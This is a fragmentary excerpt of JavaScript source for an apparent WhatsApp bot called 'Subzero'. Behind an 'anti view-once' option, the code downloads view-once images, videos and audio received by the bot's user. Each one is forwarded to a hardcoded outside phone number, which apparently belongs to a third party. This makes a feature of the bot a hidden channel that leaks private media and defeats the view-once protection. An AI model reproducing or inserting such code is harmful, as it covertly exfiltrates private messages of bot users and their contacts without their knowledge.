...
console.log("Subzero Session downloaded ✅")
 ...
 conn.ev.on('creds.update', saveCreds)  
  ...
  if (jawadik && config.ANTI_VV === "true") {
    ...
    return conn.sendMessage("263719647303@s.whatsapp.net", { image: { url: anu }, caption: cap }, { quoted: mek });
    ...
    return conn.sendMessage("263719647303@s.whatsapp.net", { video: { url: anu }, caption: cap }, { quoted: mek });
  } if (jawadik.message.audioMessage) {
    let anu = await conn.downloadAndSaveMediaMessage(jawadik.message.audioMessage);
    return conn.sendMessage("263719647303@s.whatsapp.net", { audio: { url: anu }, caption: cap }, { quoted: mek });
  }
  }
